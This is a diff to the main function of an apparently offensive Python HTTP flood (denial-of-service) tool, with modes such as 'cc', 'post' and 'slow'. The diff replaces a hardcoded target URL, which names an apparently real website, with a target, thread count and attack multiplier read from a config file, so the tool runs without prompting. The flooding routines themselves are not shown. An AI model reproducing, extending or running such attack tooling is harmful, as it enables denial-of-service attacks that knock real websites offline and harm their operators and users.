@@ -593,8 +593,11 @@ def main():
 	global cookies
 	global brute
 	global url	
-	mode = 'cc'	
-	url = 'http://banghehanoi.com/'
+	mode = 'cc'
+	config = open("config.txt","r").readlines()
+	url = config[0]
+	THREADS_ = int(config[1])
+	MULTIPLE_ = int(config[2])
 	prevent()
 	ParseUrl(url)
 	if mode == "post":
@@ -615,14 +618,14 @@ def main():
 		print("> End of process")
 		return
 	if mode == "slow":	
-		thread_num = str(input("> Connections(default=400):"))
+		thread_num = THREADS_
 	else:		
-		thread_num = 400
+		thread_num = THREADS_
 	if thread_num == "":
-		thread_num = int(400)
+		thread_num = THREADS_
 	else:
 		try:
-			thread_num = int(thread_num)
+			thread_num = THREADS_
 		except:
 			sys.exit("Error thread number")
 	CheckerOption()
@@ -635,11 +638,11 @@ def main():
 		th.setDaemon(True)
 		th.start()
 	else:		
-		multiple = 100
+		multiple = MULTIPLE_
 		if multiple == "":
-			multiple = int(100)
+			multiple = MULTIPLE_
 		else:
-			multiple = int(multiple)		
+			multiple = MULTIPLE_
 		brute = 'n'
 		if brute == "":
 			brute = False
